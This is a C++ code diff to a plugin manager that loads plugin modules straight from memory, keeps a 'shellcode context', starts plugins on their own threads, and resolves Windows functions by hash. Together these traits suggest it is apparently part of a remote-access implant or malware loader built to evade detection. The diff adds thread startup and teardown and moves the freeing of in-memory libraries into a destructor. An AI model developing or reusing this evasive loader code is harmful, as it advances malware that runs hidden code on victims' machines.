@@ -25,6 +25,7 @@ class PluginManagerInterfacePrivate :public pluginManagerInterface{
         friend class PluginManager;
     public:
         PluginManagerInterfacePrivate(PluginManager& mgr, plugin& p);
+        ~PluginManagerInterfacePrivate();
         plugin* getPlugInformation();
         virtual int sendData(const char* data,uint size);
         virtual int setErrorCode(uint code);
@@ -39,7 +40,7 @@ PluginManager::~PluginManager(){
     if(pluginList){
         DebufPrintf("unloading plugin\n");
         while(pluginList->size()) {
-            FreeLibraryFromMemory(Context,&(*pluginList)[0]->getPlugInformation()->Module);
+
             delete (*pluginList)[0];
             pluginList->remove(0);
         }
@@ -157,6 +158,10 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule,DArray& response){
                 pluginPrivate = new PluginManagerInterfacePrivate(*this,*newPlugin);
                 //pluginList = pluginPrivate;
                 pluginList->add(pluginPrivate);
+
+                newPlugin->hThread = CreateThread(null,0
+                                                  ,(LPTHREAD_START_ROUTINE)&PluginInterface::startThread
+                                                  ,newPlugin->plugInterface,0,null);
                 result = true;
             }else{
                 DebufPrintf("[pm] getInterface not fund\n");
@@ -178,7 +183,7 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule,DArray& response){
 plugin* PluginManager::getPluginById(ulong id){
     plugin* result = null;
     if(pluginList){
-        for (int i = 0; i < pluginList->size(); ++i) {
+        for (uint i = 0; i < pluginList->size(); ++i) {
             if((*pluginList)[i]->getPlugInformation()->ID == id){
                 result = (*pluginList)[i]->getPlugInformation();
                 break;
@@ -193,6 +198,10 @@ RPEP *PluginManager::getProtocol(){
     return protocol;
 }
 
+SHELLCODE_CONTEXT *PluginManager::getContext(){
+    return Context;
+}
+
 bool PluginManager::isPluginLoad(ushort ID){
     DebufPrintf("[pm] isPluginLoad \n");
     return getPluginById(ID)!= null;
@@ -202,6 +211,12 @@ PluginManagerInterfacePrivate::PluginManagerInterfacePrivate(PluginManager &mgr,
     this->mgr = &mgr;
     this->p = &p;
     p.plugInterface->setPluginManager(this);
+}
+
+PluginManagerInterfacePrivate::~PluginManagerInterfacePrivate(){
+    MEMORYMODULE module = p->Module;
+    delete p;
+    FreeLibraryFromMemory(mgr->getContext(),&module);
 }
 
 plugin* PluginManagerInterfacePrivate::getPlugInformation(){
@@ -238,6 +253,12 @@ bool PluginManager::runPluginCMD(ulong pluginID, char *data, uint size){
          result = true;
     }
     return result;
+}
+
+void PluginInterface::startThread(PluginInterface* i){
+    if(i){
+        i->run();
+    }
 }
 
 #define FNV_PRIME_32 16777619
@@ -296,4 +317,14 @@ FARPROC WINAPI GetProcAddressByHash(HINSTANCE hModule,ulong hash){
 FARPROC WINAPI GPA_WRAPPER(HMODULE hModule, LPCTSTR lpProcName){
     DebufPrintf("[pm] GPA_WRAPPER \n");
    return GetProcAddressByHash(hModule, fnv32(lpProcName));
+}
+
+
+plugin::plugin(){
+}
+
+plugin::~plugin(){
+    delete plugInterface;
+    TerminateThread(hThread,0);
+    CloseHandle(hThread);
 }
